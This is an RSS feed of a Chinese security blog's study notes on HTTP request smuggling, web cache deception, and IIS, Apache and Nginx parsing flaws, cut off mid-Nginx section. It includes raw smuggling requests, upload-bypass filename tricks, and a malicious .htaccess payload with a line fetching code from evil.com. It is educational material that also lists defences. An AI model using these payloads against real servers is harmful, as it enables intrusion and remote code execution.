<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Khala • Posts by &#34;网络安全&#34; tag</title>
        <link>https://mobius-0.github.io</link>
        <description>GLHF</description>
        <language>zh-CN</language>
        <pubDate>Sun, 27 Nov 2022 15:47:26 +0800</pubDate>
        <lastBuildDate>Sun, 27 Nov 2022 15:47:26 +0800</lastBuildDate>
        <category>Hexo</category>
        <category>shoya</category>
        <category>网站</category>
        <category>网络安全</category>
        <category>工具</category>
        <category>虚拟机</category>
        <category>安全</category>
        <category>星际争霸2</category>
        <category>平衡</category>
        <category>杂谈</category>
        <category>网易</category>
        <category>暴雪</category>
        <category>动画</category>
        <category>江南</category>
        <category>龙族</category>
        <category>小说</category>
        <category>法律法规</category>
        <category>XSS</category>
        <category>漏洞</category>
        <category>渗透测试</category>
        <category>靶场</category>
        <category>pikachu</category>
        <category>Kerberos认证</category>
        <category>JWT</category>
        <category>认证</category>
        <category>单点登录</category>
        <category>Windows</category>
        <category>挑战/应答</category>
        <category>S/Key协议</category>
        <category>权限设置</category>
        <category>虚拟化</category>
        <category>Docker</category>
        <category>镜像</category>
        <category>域名</category>
        <category>DNS</category>
        <category>WEB</category>
        <category>标准</category>
        <category>OCI</category>
        <category>CRI</category>
        <category>计算机网络</category>
        <category>IPSec</category>
        <category>VPN</category>
        <category>HTTP</category>
        <category>SSL</category>
        <category>TLS</category>
        <category>WiFi</category>
        <category>邮件</category>
        <category>网络协议</category>
        <category>入侵检测</category>
        <category>IDS</category>
        <category>IPS</category>
        <category>防御加固</category>
        <category>管理策略</category>
        <category>分工</category>
        <category>职能</category>
        <category>情报</category>
        <category>运营</category>
        <category>开发过程</category>
        <category>应急响应</category>
        <category>流程</category>
        <category>Linux</category>
        <category>攻击溯源</category>
        <category>分析模型</category>
        <category>网络攻防</category>
        <category>蜜罐</category>
        <category>隐藏</category>
        <category>诱导</category>
        <category>防御纵深</category>
        <category>访问控制</category>
        <category>过滤</category>
        <category>框架</category>
        <category>风险</category>
        <category>控制</category>
        <category>渗透</category>
        <category>信息收集</category>
        <category>痕迹清理</category>
        <category>内网</category>
        <category>后门</category>
        <category>免杀</category>
        <category>代理</category>
        <category>Shell</category>
        <category>远程连接</category>
        <category>ASP</category>
        <category>CSharp</category>
        <category>Golang</category>
        <category>Java</category>
        <category>语言</category>
        <category>反序列化</category>
        <category>混淆</category>
        <category>沙箱</category>
        <category>类</category>
        <category>JDK</category>
        <category>JavaScript</category>
        <category>PHP</category>
        <category>PowerShell</category>
        <category>Python</category>
        <category>Ruby</category>
        <category>CSRF</category>
        <category>服务器</category>
        <category>SQL注入</category>
        <category>SSRF</category>
        <category>Cache</category>
        <category>XXE</category>
        <category>XML</category>
        <category>Xpath</category>
        <category>注入</category>
        <category>函数</category>
        <category>绕过</category>
        <category>遍历</category>
        <category>包含</category>
        <category>文件</category>
        <category>目录</category>
        <category>读取</category>
        <category>上传</category>
        <category>逻辑</category>
        <category>中间件</category>
        <category>IIS</category>
        <category>Apache</category>
        <category>Nginx</category>
        <category>策略配置</category>
        <category>端口</category>
        <category>社会工程学</category>
        <category>搜索</category>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/HTTP%20request/</guid>
            <title>HTTP请求走私</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/HTTP%20request/</link>
            <category>网络安全</category>
            <category>HTTP</category>
            <category>服务器</category>
            <pubDate>Sun, 27 Nov 2022 15:47:26 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;HTTP 请求走私是一种干扰网站处理 HTTP 请求序列方式的技术，最早在 2005 年的一篇 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY2dpc2VjdXJpdHkuY29tL2xpYi9IVFRQLVJlcXVlc3QtU211Z2dsaW5nLnBkZg==&#34;&gt;文章&lt;/span&gt; 中被提出。&lt;/p&gt;
&lt;h1 id=&#34;成因&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#成因&#34;&gt;#&lt;/a&gt; 成因&lt;/h1&gt;
&lt;p&gt;请求走私大多发生于前端服务器和后端服务器对客户端传入的数据理解不一致的情况。这是因为 HTTP 规范提供了两种不同的方法来指定请求的结束位置，即  &lt;code&gt;Content-Length&lt;/code&gt;  和  &lt;code&gt;Transfer-Encoding&lt;/code&gt;  标头。&lt;/p&gt;
&lt;h1 id=&#34;分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#分类&#34;&gt;#&lt;/a&gt; 分类&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;CLTE：前端服务器使用  &lt;code&gt;Content-Length&lt;/code&gt;  头，后端服务器使用  &lt;code&gt;Transfer-Encoding&lt;/code&gt;  头&lt;/li&gt;
&lt;li&gt;TECL：前端服务器使用  &lt;code&gt;Transfer-Encoding&lt;/code&gt;  标头，后端服务器使用  &lt;code&gt;Content-Length&lt;/code&gt;  标头。&lt;/li&gt;
&lt;li&gt;TETE：前端和后端服务器都支持  &lt;code&gt;Transfer-Encoding&lt;/code&gt;  标头，但是可以通过以某种方式来诱导其中一个服务器不处理它。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击&#34;&gt;#&lt;/a&gt; 攻击&lt;/h1&gt;
&lt;h2 id=&#34;cl不为0的get请求&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cl不为0的get请求&#34;&gt;#&lt;/a&gt; CL 不为 0 的 GET 请求&lt;/h2&gt;
&lt;p&gt;当前端服务器允许 GET 请求携带请求体，而后端服务器不允许 GET 请求携带请求体，它会直接忽略掉 GET 请求中的  &lt;code&gt;Content-Length&lt;/code&gt;  头，不进行处理。例如下面这个例子：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 44\r\n

GET /secret HTTP/1.1\r\n
Host: example.com\r\n
\r\n
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;前端服务器处理了  &lt;code&gt;Content-Length&lt;/code&gt;  ，而后端服务器没有处理  &lt;code&gt;Content-Length&lt;/code&gt;  ，基于 pipeline 机制认为这是两个独立的请求，就造成了漏洞的发生。&lt;/p&gt;
&lt;h2 id=&#34;cl-cl&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cl-cl&#34;&gt;#&lt;/a&gt; CL-CL&lt;/h2&gt;
&lt;p&gt;根据 RFC 7230，当服务器收到的请求中包含两个  &lt;code&gt;Content-Length&lt;/code&gt;  ，而且两者的值不同时，需要返回 400 错误，但是有的服务器并没有严格实现这个规范。这种情况下，当前后端各取不同的  &lt;code&gt;Content-Length&lt;/code&gt;  值时，就会出现漏洞。例如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 8\r\n
Content-Length: 7\r\n

12345\r\n
a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个例子中 a 就会被带入下一个请求，变为  &lt;code&gt;aGET / HTTP/1.1\r\n&lt;/code&gt;  。&lt;/p&gt;
&lt;h2 id=&#34;cl-te&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cl-te&#34;&gt;#&lt;/a&gt; CL-TE&lt;/h2&gt;
&lt;p&gt;CL-TE 指前端服务器处理  &lt;code&gt;Content-Length&lt;/code&gt;  这一请求头，而后端服务器遵守 RFC2616 的规定，忽略掉  &lt;code&gt;Content-Length&lt;/code&gt;  ，处理  &lt;code&gt;Transfer-Encoding&lt;/code&gt;  。例如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST / HTTP/1.1\r\n
Host: example.com\r\n
...
Connection: keep-alive\r\n
Content-Length: 6\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个例子中 a 同样会被带入下一个请求，变为  &lt;code&gt;aGET / HTTP/1.1\r\n&lt;/code&gt;  。&lt;/p&gt;
&lt;h2 id=&#34;te-cl&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#te-cl&#34;&gt;#&lt;/a&gt; TE-CL&lt;/h2&gt;
&lt;p&gt;TE-CL 指前端服务器处理  &lt;code&gt;Transfer-Encoding&lt;/code&gt;  请求头，而后端服务器处理  &lt;code&gt;Content-Length&lt;/code&gt;  请求头。例如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST / HTTP/1.1\r\n
Host: example.com\r\n
...
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
\r\n
12\r\n
aPOST / HTTP/1.1\r\n
\r\n
0\r\n
\r\n
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;te-te&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#te-te&#34;&gt;#&lt;/a&gt; TE-TE&lt;/h2&gt;
&lt;p&gt;TE-TE 指前后端服务器都处理  &lt;code&gt;Transfer-Encoding&lt;/code&gt;  请求头，但是在容错性上表现不同，例如有的服务器可能会处理  &lt;code&gt;Transfer-encoding&lt;/code&gt;  ，测试例如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST / HTTP/1.1\r\n
Host: example.com\r\n
...
Content-length: 4\r\n
Transfer-Encoding: chunked\r\n
Transfer-encoding: cow\r\n
\r\n
5c\r\n
aPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御&#34;&gt;#&lt;/a&gt; 防御&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;禁用后端连接重用&lt;/li&gt;
&lt;li&gt;确保连接中的所有服务器具有相同的配置&lt;/li&gt;
&lt;li&gt;拒绝有二义性的请求&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;h2 id=&#34;rfc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rfc&#34;&gt;#&lt;/a&gt; RFC&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzI2MTY=&#34;&gt;RFC 2616 Hypertext Transfer Protocol -- HTTP/1.1&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzcyMzA=&#34;&gt;RFC 7230 Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing -- HTTP/1.1&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;blog-whitepaper&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#blog-whitepaper&#34;&gt;#&lt;/a&gt; Blog / Whitepaper&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY2dpc2VjdXJpdHkuY29tL2xpYi9IVFRQLVJlcXVlc3QtU211Z2dsaW5nLnBkZg==&#34;&gt;HTTP Request Smuggling by chaiml&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3JlcXVlc3Qtc211Z2dsaW5n&#34;&gt;HTTP request smuggling by portswigger&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjY1NA==&#34;&gt;从一道题到协议层攻击之 HTTP 请求走私&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2kuYmxhY2toYXQuY29tL1VTQS0yMC9XZWRuZXNkYXkvdXMtMjAtS2xlaW4tSFRUUC1SZXF1ZXN0LVNtdWdnbGluZy1Jbi0yMDIwLU5ldy1WYXJpYW50cy1OZXctRGVmZW5zZXMtQW5kLU5ldy1DaGFsbGVuZ2VzLnBkZg==&#34;&gt;HTTP Request Smuggling in 2020&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sYWJzLmJpc2hvcGZveC5jb20vdGVjaC1ibG9nL2gyYy1zbXVnZ2xpbmctcmVxdWVzdC1zbXVnZ2xpbmctdmlhLWh0dHAvMi1jbGVhcnRleHQtaDJj&#34;&gt;h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c)&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/Web%20Cache/</guid>
            <title>Web Cache欺骗攻击</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/Web%20Cache/</link>
            <category>网络安全</category>
            <category>漏洞</category>
            <category>Cache</category>
            <pubDate>Sun, 27 Nov 2022 15:42:19 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;网站通常都会通过如 CDN、负载均衡器、或者反向代理来实现 Web 缓存功能。通过缓存频繁访问的文件，降低服务器响应延迟。&lt;/p&gt;
&lt;p&gt;例如，网站  &lt;code&gt;htttp://www.example.com&lt;/code&gt;  配置了反向代理。对于那些包含用户个人信息的页面，如  &lt;code&gt;http://www.example.com/home.php&lt;/code&gt;  ，由于每个用户返回的内容有所不同，因此这类页面通常是动态生成，并不会在缓存服务器中进行缓存。通常缓存的主要是可公开访问的静态文件，如 css 文件、js 文件、txt 文件、图片等等。此外，很多最佳实践类的文章也建议，对于那些能公开访问的静态文件进行缓存，并且忽略 HTTP 缓存头。&lt;/p&gt;
&lt;p&gt;Web cache 攻击类似于 RPO 相对路径重写攻击，都依赖于浏览器与服务器对 URL 的解析方式。当访问不存在的 URL 时，如  &lt;code&gt;http://www.example.com/home.php/non-existent.css&lt;/code&gt;  ，浏览器发送 get 请求，依赖于使用的技术与配置，服务器返回了页面  &lt;code&gt;http://www.example.com/home.php&lt;/code&gt;  的内容，同时 URL 地址仍然是  &lt;code&gt;http://www.example.com/home.php/non-existent.css&lt;/code&gt; ，http 头的内容也与直接访问  &lt;code&gt;http://www.example.com/home.php&lt;/code&gt;  相同，cacheing header、content-type（此处为 text/html）也相同。&lt;/p&gt;
&lt;h1 id=&#34;漏洞成因&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞成因&#34;&gt;#&lt;/a&gt; 漏洞成因&lt;/h1&gt;
&lt;p&gt;当代理服务器设置为缓存静态文件并忽略这类文件的 caching header 时，访问  &lt;code&gt;http://www.example.com/home.php/no-existent.css&lt;/code&gt;  时，会发生什么呢？整个响应流程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;浏览器请求  &lt;code&gt;http://www.example.com/home.php/no-existent.css&lt;/code&gt;  ;&lt;/li&gt;
&lt;li&gt;服务器返回  &lt;code&gt;http://www.example.com/home.php&lt;/code&gt;  的内容 (通常来说不会缓存该页面);&lt;/li&gt;
&lt;li&gt;响应经过代理服务器；&lt;/li&gt;
&lt;li&gt;代理识别该文件有 css 后缀；&lt;/li&gt;
&lt;li&gt;在缓存目录下，代理服务器创建目录  &lt;code&gt;home.php&lt;/code&gt;  ，将返回的内容作为  &lt;code&gt;non-existent.css&lt;/code&gt;  保存。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;漏洞利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞利用&#34;&gt;#&lt;/a&gt; 漏洞利用&lt;/h1&gt;
&lt;p&gt;攻击者欺骗用户访问  &lt;code&gt;http://www.example.com/home.php/logo.png?www.myhack58.com&lt;/code&gt;  , 导致含有用户个人信息的页面被缓存，从而能被公开访问到。更严重的情况下，如果返回的内容包含 session 标识、安全问题的答案，或者 csrf token。这样攻击者能接着获得这些信息，因为通常而言大部分网站静态资源都是公开可访问的。&lt;/p&gt;
&lt;h1 id=&#34;漏洞存在的条件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞存在的条件&#34;&gt;#&lt;/a&gt; 漏洞存在的条件&lt;/h1&gt;
&lt;p&gt;漏洞要存在，至少需要满足下面两个条件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;web cache 功能根据扩展进行保存，并忽略 caching header;&lt;/li&gt;
&lt;li&gt;当访问如  &lt;code&gt;http://www.example.com/home.php/non-existent.css&lt;/code&gt;  不存在的页面，会返回  &lt;code&gt;home.php&lt;/code&gt;  的内容。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;漏洞防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞防御&#34;&gt;#&lt;/a&gt; 漏洞防御&lt;/h1&gt;
&lt;p&gt;防御措施主要包括 3 点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;设置缓存机制，仅仅缓存 http caching header 允许的文件，这能从根本上杜绝该问题；&lt;/li&gt;
&lt;li&gt;如果缓存组件提供选项，设置为根据 content-type 进行缓存；&lt;/li&gt;
&lt;li&gt;访问  &lt;code&gt;http://www.example.com/home.php/non-existent.css&lt;/code&gt;  这类不存在页面，不返回  &lt;code&gt;home.php&lt;/code&gt;  的内容，而返回 404 或者 302。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;web-cache欺骗攻击实例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-cache欺骗攻击实例&#34;&gt;#&lt;/a&gt; Web Cache 欺骗攻击实例&lt;/h1&gt;
&lt;h2 id=&#34;paypal&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#paypal&#34;&gt;#&lt;/a&gt; Paypal&lt;/h2&gt;
&lt;p&gt;Paypal 在未修复之前，通过该攻击，可以获取的信息包括：用户姓名、账户金额、信用卡的最后 4 位数、交易数据、emaill 地址等信息。 受该攻击的部分页面包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;https://www.paypal.com/myaccount/home/attack.css&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;https://www.paypal.com/myaccount/settings/notifications/attack.css&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;https://history.paypal.com/cgi-bin/webscr/attack.css?cmd=_history-details&lt;/code&gt;  。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYmxvZy9wcmFjdGljYWwtd2ViLWNhY2hlLXBvaXNvbmluZw==&#34;&gt;practical web cache poisoning&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9jb25mZXJlbmNlL3VzZW5peHNlY3VyaXR5MTgvcHJlc2VudGF0aW9uL2hhbw==&#34;&gt;End-Users Get Maneuvered: Empirical Analysis of Redirection Hijacking in Content Delivery Networks&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E4%B8%AD%E9%97%B4%E4%BB%B6/</guid>
            <title>中间件</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E4%B8%AD%E9%97%B4%E4%BB%B6/</link>
            <category>网络安全</category>
            <category>中间件</category>
            <category>IIS</category>
            <category>Apache</category>
            <category>Nginx</category>
            <pubDate>Sun, 27 Nov 2022 10:59:09 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;iis&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iis&#34;&gt;#&lt;/a&gt; IIS&lt;/h1&gt;
&lt;h2 id=&#34;iis-60&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iis-60&#34;&gt;#&lt;/a&gt; IIS 6.0&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;后缀解析  &lt;code&gt;/xx.asp;.jpg&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务器默认不解析  &lt;code&gt;;&lt;/code&gt;  号及其后面的内容，相当于截断。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;目录解析  &lt;code&gt;/xx.asp/xx.jpg&lt;/code&gt;  (xx.asp 目录下任意解析)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;默认解析  &lt;code&gt;xx.asa&lt;/code&gt;   &lt;code&gt;xx.cer&lt;/code&gt;   &lt;code&gt;xx.cdx&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PROPFIND 栈溢出漏洞&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;RCE CVE-2017-7269&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;iis-70-75-nginx-0837&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iis-70-75-nginx-0837&#34;&gt;#&lt;/a&gt; IIS 7.0-7.5 / Nginx &amp;lt;= 0.8.37&lt;/h2&gt;
&lt;p&gt;在 Fast-CGI 开启状态下，在文件路径后加上  &lt;code&gt;/xx.php&lt;/code&gt;  ，即  &lt;code&gt;xx.jpg/xx.php&lt;/code&gt;  会被解析为 php 文件。&lt;/p&gt;
&lt;h2 id=&#34;put漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#put漏洞&#34;&gt;#&lt;/a&gt; PUT 漏洞&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;开启 WebDAV&lt;/li&gt;
&lt;li&gt;拥有来宾用户，且来宾用户拥有上传权限&lt;/li&gt;
&lt;li&gt;可任意文件上传&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;windows特性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#windows特性&#34;&gt;#&lt;/a&gt; Windows 特性&lt;/h2&gt;
&lt;p&gt;Windows 不允许空格和点以及一些特殊字符作为结尾，创建这样的文件会自动重命名，所以可以使用  &lt;code&gt;xx.php[空格]&lt;/code&gt;  ，  &lt;code&gt;xx.php.&lt;/code&gt; ，  &lt;code&gt;xx.php/&lt;/code&gt; ，  &lt;code&gt;xx.php::$DATA&lt;/code&gt;  上传脚本文件。&lt;/p&gt;
&lt;h2 id=&#34;文件名猜解&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件名猜解&#34;&gt;#&lt;/a&gt; 文件名猜解&lt;/h2&gt;
&lt;p&gt;在支持 NTFS 8.3 文件格式时，可利用短文件名猜解目录文件。其中短文件名特征如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文件名为原文件名前 6 位字符加上  &lt;code&gt;~1&lt;/code&gt;  ，其中数字部分是递增的，如果存在前缀相同的文件，则后面的数字进行递增。&lt;/li&gt;
&lt;li&gt;后缀名不超过 3 位，超过部分会被截断&lt;/li&gt;
&lt;li&gt;所有小写字母均转换成大写的字母&lt;/li&gt;
&lt;li&gt;文件名后缀长度大于等于 4 或者总长度大于等于 9 时才会生成短文件名，如果包含空格或者其他部分特殊字符，则无视长度条件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;IIS 8.0 之前的版本支持短文件名猜测的 HTTP 方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE 六种，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1BU1AtcGQwZnEwMXJnNmE4NDRkLk5FVA==&#34;&gt;需要安装 ASP.NET&lt;/span&gt;。而 IIS 8.0 之后的版本只能通过 OPTIONS 和 TRACE 方法猜测成功，但是没有 ASP.NET 的限制。&lt;/p&gt;
&lt;p&gt;这种方法的局限性在于：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文件夹名前 6 位字符带点”.”，扫描程序会认为是文件而不是文件夹，最终出现误报&lt;/li&gt;
&lt;li&gt;不支持中文文件名&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这种方法可以通过命令  &lt;code&gt;fsutil behavior set disable8dot3 1&lt;/code&gt;  关闭 NTFS 8.3 文件格式的支持来修复。&lt;/p&gt;
&lt;h2 id=&#34;41516-参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#41516-参考链接&#34;&gt;#&lt;/a&gt; 4.15.1.6. 参考链接&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjMxOA==&#34;&gt;利用 Windows 特性高效猜测目录&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zb3JvdXNoLnNlY3Byb2plY3QuY29tL2Jsb2cvMjAxOS8wOC91cGxvYWRpbmctd2ViLWNvbmZpZy1mb3ItZnVuLWFuZC1wcm9maXQtMi8=&#34;&gt;Uploading web.config for Fun and Profit 2&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;apache&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#apache&#34;&gt;#&lt;/a&gt; Apache&lt;/h1&gt;
&lt;h2 id=&#34;后缀解析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#后缀解析&#34;&gt;#&lt;/a&gt; 后缀解析&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;test.php.x1.x2.x3&lt;/code&gt;  （ x1,x2,x3 为没有在 mime.types 文件中定义的文件类型）。Apache 将从右往左开始判断后缀， 若 x3 为非可识别后缀，则判断 x2，直到找到可识别后缀为止，然后对可识别后缀进行解析&lt;/p&gt;
&lt;h2 id=&#34;htaccess&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#htaccess&#34;&gt;#&lt;/a&gt; .htaccess&lt;/h2&gt;
&lt;p&gt;当 AllowOverride 被启用时，上传启用解析规则的.htaccess&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;AddType application/x-httpd-php .jpg
php_value auto_append_file .htaccess
#&amp;lt;?php phpinfo();
Options ExecCGI
AddHandler cgi-script .jpg
Options +ExecCGI
AddHandler fcgid-script .gif
FcgidWrapper &amp;quot;/bin/bash&amp;quot; .gif
php_flag allow_url_include 1
php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B
#php_value auto_append_file https://evil.com/evil-code.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;目录遍历&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目录遍历&#34;&gt;#&lt;/a&gt; 目录遍历&lt;/h2&gt;
&lt;p&gt;配置  &lt;code&gt;Options +Indexes&lt;/code&gt;  时 Apache 存在目录遍历漏洞。&lt;/p&gt;
&lt;h2 id=&#34;cve-2017-15715&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2017-15715&#34;&gt;#&lt;/a&gt; CVE-2017-15715&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;%0A&lt;/code&gt;  绕过上传黑名单。&lt;/p&gt;
&lt;h2 id=&#34;lighttpd&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#lighttpd&#34;&gt;#&lt;/a&gt; lighttpd&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;xx.jpg/xx.php
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vYXBhY2hlLWN2ZS0yMDE3LTE1NzE1LXZ1bG5lcmFiaWxpdHkuaHRtbA==&#34;&gt;Apache 上传绕过&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;nginx&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nginx&#34;&gt;#&lt;/a&gt; Nginx&lt;/h1&gt;
&lt;h2 id=&#34;fast-cgi关闭&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fast-cgi关闭&#34;&gt;#&lt;/a&gt; Fast-CGI 关闭&lt;/h2&gt;
